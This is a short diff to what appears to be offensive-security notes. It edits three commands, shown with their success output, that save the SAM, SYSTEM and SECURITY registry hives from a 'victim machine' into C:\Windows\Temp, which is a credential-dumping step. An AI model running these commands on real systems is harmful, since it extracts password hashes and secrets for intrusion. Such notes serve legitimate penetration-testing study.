@@ -14,13 +14,13 @@
 ### Saving Registry Hives on the Victim Machine
 
 ```cmd
-C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save
+C:\WINDOWS\system32> reg.exe save hklm\sam C:\Windows\Temp\sam.save
 The operation completed successfully.
 
-C:\WINDOWS\system32> reg save hklm\system C:\system.save
+C:\WINDOWS\system32> reg save hklm\system C:\Windows\Temp\system.save
 The operation completed successfully.
 
-C:\WINDOWS\system32> reg save hklm\security C:\security.save
+C:\WINDOWS\system32> reg save hklm\security C:\Windows\Temp\security.save
 The operation completed successfully.
 ```
 
